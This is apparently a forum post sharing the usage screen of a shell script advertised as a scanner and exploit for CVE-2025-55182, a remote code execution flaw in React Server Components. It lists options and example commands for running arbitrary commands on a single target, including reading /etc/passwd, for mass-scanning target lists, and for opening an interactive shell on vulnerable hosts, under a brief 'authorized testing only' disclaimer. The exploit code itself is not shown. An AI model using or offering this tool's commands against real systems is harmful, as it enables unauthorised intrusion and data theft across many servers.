Sharing what i've been using for react2shell


             _ _             _       _                 
 _ __  _   _| | |_ __   ___ (_)_ __ | |_ ___  ___  ___ 
| '_ \| | | | | | '_ \ / _ \| | '_ \| __/ __|/ _ \/ __|
| | | | |_| | | | |_) | (_) | | | | | |_\__ \  __/ (__ 
|_| |_|\__,_|_|_| .__/ \___/|_|_| |_|\__|___/\___|\___|
                |_|                                    

════════════════════════════════════════════════════════════════
          CVE-2025-55182 [EXPLOIT] Scanner v2.1.0-FAST
          React Server Components RCE Scanner
          [ urs frndli hooman ]
════════════════════════════════════════════════════════════════

[!] Initializing attack modules...
[+] Payload generator: LOADED
[+] Exploit engine: ACTIVE
[+] Network module: READY

╔════════════════════════════════════════════════════════════╗
║                    USAGE MANUAL                          ║
╚════════════════════════════════════════════════════════════╝

SYNTAX: v.sh [OPTIONS]

OPTIONS:
  -d, --domain    Target domain/URL (default: http://localhost:3000)
                   If no protocol specified, defaults to https://
  -l, --list      File containing list of targets (one per line)
                   Supports: IP:port, domain, or full URLs
  -c, --command   Command to execute (default: id)
  -o, --output    Output file for results (default: scan_results.txt)
  --shell         Interactive shell mode (after scanning)
  -q, --quiet     Quiet mode (minimal output, faster scanning)
  -h, --help      Show this help message

ATTACK MODES:
  [1] Single Target:
      v.sh -d vulnapp.com -c id
      v.sh -d http://localhost:3000 -c "cat /etc/passwd"

  [2] Mass Scanning:
      v.sh -l targets.txt -c id
      v.sh -l targets.txt -c "whoami" -o results.txt

  [3] Interactive Shell (Pick Vulnerable Target):
      v.sh -l targets.txt --shell
      v.sh -d vulnapp.com --shell

TARGET LIST FORMAT:
  example.com
  192.168.1.100:3000
  subdomain.example.com:8080
  http://already-has-protocol.com

[!] Use responsibly. For authorized testing only.

